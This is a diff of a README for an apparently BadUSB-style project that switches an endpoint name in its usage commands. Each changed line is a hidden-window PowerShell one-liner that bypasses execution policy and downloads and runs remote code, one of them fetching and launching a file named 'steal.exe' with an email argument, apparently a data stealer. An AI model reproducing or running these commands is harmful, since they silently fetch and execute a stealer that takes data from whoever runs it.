@@ -186,7 +186,7 @@ file: [loadexe.ps1](loadexe.ps1)
 
 ### usage
 ```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
 ```
 (executes python installer gui from [python.org/ftp/python/3.12.4/python-3.12.4.exe](https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe), uses [kaliiiiiiiiii/vercel_utils_server/exe2ps1](https://github.com/kaliiiiiiiiii/vercel_utils_server/blob/main/app/exe2ps1/route.ts)) \
 or
@@ -212,7 +212,7 @@ python build.py
 download from this repo
 (executes script at [`https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https://raw.githubusercontent.com/kaliiiiiiiiii/PublicDuckyChallenger/master/dist/steal.exe&arg=example@example.com`](https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com))
 ```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
 ```
 or execute the exe
 ```shell
